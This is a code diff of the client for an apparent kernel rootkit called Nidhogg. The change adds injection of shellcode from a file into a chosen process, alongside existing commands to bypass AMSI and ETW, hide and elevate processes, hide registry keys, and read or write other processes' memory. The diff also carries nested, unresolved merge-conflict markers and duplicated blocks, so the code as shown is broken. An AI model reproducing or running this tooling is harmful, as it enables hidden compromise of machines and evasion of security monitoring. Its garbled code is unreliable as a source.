@@ -10,6 +10,7 @@ enum class Options {
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 	Add, Remove, Clear, Hide, Elevate, Query
 =======
 	Add, Remove, Clear, Hide, Elevate
@@ -23,6 +24,9 @@ enum class Options {
 =======
 	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read
 >>>>>>> a20f2bb (Updated client)
+=======
+	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read, Patch, InjectShellcode, InjectDll
+>>>>>>> 04ddc77 (Added usermode shellcode injection)
 };
 
 void PrintUsage() {
@@ -33,6 +37,8 @@ void PrintUsage() {
 	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
 	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma seperated]" << std::endl;
 	std::cout << "\tNidhoggClient.exe [write | read] [pid] [remote address] [size] [mode]" << std::endl;
+	std::cout << "\tNidhoggClient.exe shinject [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
+	std::cout << "\tNidhoggClient.exe dllinject [pid] [dll path]" << std::endl;
 }
 
 int Error(int errorCode) {
@@ -127,35 +133,43 @@ int wmain(int argc, const wchar_t* argv[]) {
 	if (argc < 3)
 		return Error(NIDHOGG_INVALID_COMMAND);
 
+	if (_wcsicmp(argv[2], L"add") == 0)
+		option = Options::Add;
+	else if (_wcsicmp(argv[2], L"remove") == 0)
+		option = Options::Remove;
+	else if (_wcsicmp(argv[2], L"clear") == 0)
+		option = Options::Clear;
+	else if (_wcsicmp(argv[2], L"hide") == 0)
+		option = Options::Hide;
+	else if (_wcsicmp(argv[2], L"unhide") == 0)
+		option = Options::Unhide;
+	else if (_wcsicmp(argv[2], L"elevate") == 0)
+		option = Options::Elevate;
+	else if (_wcsicmp(argv[2], L"signature") == 0)
+		option = Options::Signature;
+	else if (_wcsicmp(argv[2], L"query") == 0)
+		option = Options::Query;
+	else if (_wcsicmp(argv[1], L"patch") == 0)
+		option = Options::Patch;
+	else if (_wcsicmp(argv[1], L"write") == 0)
+		option = Options::Write;
+	else if (_wcsicmp(argv[1], L"read") == 0)
+		option = Options::Read;
+	else if (_wcsicmp(argv[1], L"shinject") == 0)
+		option = Options::InjectShellcode;
+	else if (_wcsicmp(argv[1], L"dllinject") == 0)
+		option = Options::InjectDll;
+	else {
+		std::cerr << "[ - ] Unknown option." << std::endl;
+		return Error(NIDHOGG_INVALID_OPTION);
+	}
+
 	HANDLE hNidhogg = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 
 	if (hNidhogg == INVALID_HANDLE_VALUE)
 		return Error(NIDHOGG_ERROR_CONNECT_DRIVER);
 
-	if (_wcsicmp(argv[1], L"patch") != 0 && _wcsicmp(argv[1], L"write") != 0 && _wcsicmp(argv[1], L"read") != 0) {
-		if (_wcsicmp(argv[2], L"add") == 0)
-			option = Options::Add;
-		else if (_wcsicmp(argv[2], L"remove") == 0)
-			option = Options::Remove;
-		else if (_wcsicmp(argv[2], L"clear") == 0)
-			option = Options::Clear;
-		else if (_wcsicmp(argv[2], L"hide") == 0)
-			option = Options::Hide;
-		else if (_wcsicmp(argv[2], L"unhide") == 0)
-			option = Options::Unhide;
-		else if (_wcsicmp(argv[2], L"elevate") == 0)
-			option = Options::Elevate;
-		else if (_wcsicmp(argv[2], L"signature") == 0)
-			option = Options::Signature;
-		else if (_wcsicmp(argv[2], L"query") == 0)
-			option = Options::Query;
-		else {
-			std::cerr << "[ - ] Unknown option." << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-			goto CleanUp;
-		}
-
-		switch (option) {
+	switch (option) {
 		case Options::Add:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
@@ -180,6 +194,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 			break;
 		}
+
 		case Options::Remove:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
@@ -204,6 +219,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 			break;
 		}
+
 		case Options::Clear:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0)
@@ -222,6 +238,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 			break;
 		}
+
 		case Options::Hide:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
@@ -246,10 +263,18 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 			break;
 		}
+
 		case Options::Unhide:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
 				success = Nidhogg::ProcessUtils::NidhoggProcessUnhide(hNidhogg, _wtoi(argv[3]));
+			}
+			else if (_wcsicmp(argv[1], L"thread") == 0) {
+				std::cerr << "[ ! ] TBA" << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
+			}
+			else if (_wcsicmp(argv[1], L"file") == 0) {
+				success = NIDHOGG_INVALID_OPTION;
 			}
 			else if (_wcsicmp(argv[1], L"reg") == 0) {
 				if (argc == 5) {
@@ -264,16 +289,22 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 			break;
 		}
+
 		case Options::Elevate:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
 				success = Nidhogg::ProcessUtils::NidhoggProcessElevate(hNidhogg, _wtoi(argv[3]));
+			}
+			else if (_wcsicmp(argv[1], L"thread") == 0) {
+				std::cerr << "[ ! ] TBA" << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
 			}
 			else {
 				success = NIDHOGG_INVALID_OPTION;
 			}
 			break;
 		}
+
 		case Options::Signature:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0 && argc == 6) {
@@ -293,6 +324,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 			break;
 		}
+
 		case Options::Query:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
@@ -343,7 +375,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 			else if (_wcsicmp(argv[1], L"reg") == 0) {
 				if (argc != 4) {
 					success = NIDHOGG_INVALID_OPTION;
-					goto CleanUp;
+					break;
 				}
 
 				if (_wcsicmp(argv[3], L"value") == 0) {
@@ -414,6 +446,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 			break;
 		}
+<<<<<<< HEAD
 		}
 	}
 <<<<<<< HEAD
@@ -646,28 +679,105 @@ int wmain(int argc, const wchar_t* argv[]) {
 		if (argc != 6 && argc != 4) {
 			success = NIDHOGG_INVALID_OPTION;
 			goto CleanUp;
+=======
+
+		case Options::Patch:
+		{
+			if (argc != 6 && argc != 4) {
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			int pid = _wtoi(argv[2]);
+
+			if (pid == 0) {
+				std::cerr << "[ - ] Invalid PID." << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			if (_wcsicmp(argv[3], L"amsi") == 0) {
+				success = Nidhogg::ModuleUtils::NidhoggAmsiBypass(hNidhogg, pid);
+			}
+			else if (_wcsicmp(argv[3], L"etw") == 0) {
+				success = Nidhogg::ModuleUtils::NidhoggETWBypass(hNidhogg, pid);
+			}
+			else {
+				std::wstring wFunctionName(argv[4]);
+				std::string functionName(wFunctionName.begin(), wFunctionName.end());
+				std::vector<byte> patch = ConvertToVector(std::wstring(argv[5]));
+
+				success = Nidhogg::ModuleUtils::NidhoggPatchModule(hNidhogg, pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
+			}
+			break;
+>>>>>>> 04ddc77 (Added usermode shellcode injection)
 		}
 >>>>>>> a20f2bb (Updated client)
 
-		int pid = _wtoi(argv[2]);
+		case Options::Write:
+		case Options::Read:
+		{
+			MODE mode;
 
-		if (pid == 0) {
-			std::cerr << "[ - ] Invalid PID." << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-			goto CleanUp;
+			if (argc != 6) {
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			if (_wcsicmp(argv[5], L"kernel") == 0)
+				mode = MODE::KernelMode;
+			else if (_wcsicmp(argv[5], L"user") == 0)
+				mode = MODE::UserMode;
+			else {
+				std::cerr << "[ - ] Invalid mode." << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			int pid = _wtoi(argv[2]);
+
+			if (pid == 0) {
+				std::cerr << "[ - ] Invalid PID." << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			int size = _wtoi(argv[4]);
+
+			if (size == 0) {
+				std::cerr << "[ - ] Invalid size." << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			int remoteAddress = ConvertToInt(argv[3]);
+
+			if (remoteAddress == 0) {
+				std::cerr << "[ - ] Invalid address." << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			if (_wcsicmp(argv[1], L"write") == 0)
+				success = Nidhogg::ModuleUtils::NidhoggWriteData(hNidhogg, pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
+			else if (_wcsicmp(argv[1], L"read") == 0) {
+				auto data = Nidhogg::ModuleUtils::NidhoggReadData(hNidhogg, pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
+
+				if ((int)data < 5)
+					success = (int)data;
+
+				std::cout << "[ + ] You can access the data here" << std::endl;
+			}
+			break;
 		}
 
-		if (_wcsicmp(argv[3], L"amsi") == 0) {
-			success = Nidhogg::ModuleUtils::NidhoggAmsiBypass(hNidhogg, pid);
-		}
-		else if (_wcsicmp(argv[3], L"etw") == 0) {
-			success = Nidhogg::ModuleUtils::NidhoggETWBypass(hNidhogg, pid);
-		}
-		else {
-			std::wstring wFunctionName(argv[4]);
-			std::string functionName(wFunctionName.begin(), wFunctionName.end());
-			std::vector<byte> patch = ConvertToVector(std::wstring(argv[5]));
+		case Options::InjectShellcode:
+		{
+			PVOID parameter1 = NULL;
+			PVOID parameter2 = NULL;
+			PVOID parameter3 = NULL;
 
+<<<<<<< HEAD
 			success = Nidhogg::ModuleUtils::NidhoggPatchModule(hNidhogg, pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
 		}
 >>>>>>> da4b5b2 (Added patching to the usermode side)
@@ -678,60 +788,54 @@ int wmain(int argc, const wchar_t* argv[]) {
 			goto CleanUp;
 		}
 		MODE mode;
+=======
+			int pid = _wtoi(argv[2]);
+>>>>>>> 04ddc77 (Added usermode shellcode injection)
 
-		if (_wcsicmp(argv[5], L"kernel") == 0)
-			mode = MODE::KernelMode;
-		else if (_wcsicmp(argv[5], L"user") == 0)
-			mode = MODE::UserMode;
-		else {
-			std::cerr << "[ - ] Invalid mode." << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-			goto CleanUp;
+			if (pid == 0) {
+				std::cerr << "[ - ] Invalid PID." << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			std::ifstream input(argv[3], std::ios::binary);
+
+			if (input.bad()) {
+				std::cerr << "[ - ] Invalid shellcode file." << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			std::vector<unsigned char> shellcode(std::istreambuf_iterator<char>(input), {});
+
+			if (argc >= 5) {
+				parameter1 = (PVOID)argv[4];
+
+				if (argc >= 6) {
+					parameter2 = (PVOID)argv[5];
+
+					if (argc == 7) {
+						parameter3 = (PVOID)argv[6];
+					}
+				}
+			}
+
+			success = Nidhogg::ModuleUtils::NidhoggInjectShellcode(hNidhogg, pid, shellcode.data(), shellcode.size(), parameter1, parameter2, parameter3);
+			break;
 		}
 
-		int pid = _wtoi(argv[2]);
-
-		if (pid == 0) {
-			std::cerr << "[ - ] Invalid PID." << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-			goto CleanUp;
-		}
-
-		int size = _wtoi(argv[4]);
-
-		if (size == 0) {
-			std::cerr << "[ - ] Invalid size." << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-			goto CleanUp;
-		}
-
-		int remoteAddress = ConvertToInt(argv[3]);
-
-		if (remoteAddress == 0) {
-			std::cerr << "[ - ] Invalid address." << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-			goto CleanUp;
-		}
-
-		if (_wcsicmp(argv[1], L"write") == 0)
-			success = Nidhogg::ModuleUtils::NidhoggWriteData(hNidhogg, pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
-		else if (_wcsicmp(argv[1], L"read") == 0) {
-			auto data = Nidhogg::ModuleUtils::NidhoggReadData(hNidhogg, pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
-
-			if ((int)data < 5)
-				success = (int)data;
-
-			std::cout << "[ + ] You can access the data here" << std::endl;
+		case Options::InjectDll:
+		{
+			std::cerr << "[ - ] TBD!" << std::endl;
+			break;
 		}
 	}
 
-CleanUp:
 	CloseHandle(hNidhogg);
 
 	if (success != NIDHOGG_SUCCESS)
 		return Error(success);
 
 	std::cout << "[ + ] Operation succeeded." << std::endl;
-
 	return success;
 }
